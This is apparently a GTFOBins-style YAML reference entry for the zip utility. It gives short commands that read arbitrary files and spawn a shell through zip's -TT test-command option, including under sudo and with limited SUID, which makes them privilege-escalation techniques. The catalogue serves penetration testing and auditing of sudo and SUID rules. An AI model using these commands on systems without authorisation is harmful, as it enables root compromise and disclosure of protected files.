---
functions:
  file-read:
    - code: |
        LFILE=file-to-read
        TF=$(mktemp -u)
        zip $TF $LFILE
        unzip -p $TF
  shell:
    - code: |
        TF=$(mktemp -u)
        zip $TF /etc/hosts -T -TT 'sh #'
        rm $TF
  sudo:
    - code: |
        TF=$(mktemp -u)
        sudo zip $TF /etc/hosts -T -TT 'sh #'
        sudo rm $TF
  limited-suid:
    - code: |
        TF=$(mktemp -u)
        ./zip $TF /etc/hosts -T -TT 'sh #'
        sudo rm $TF
---
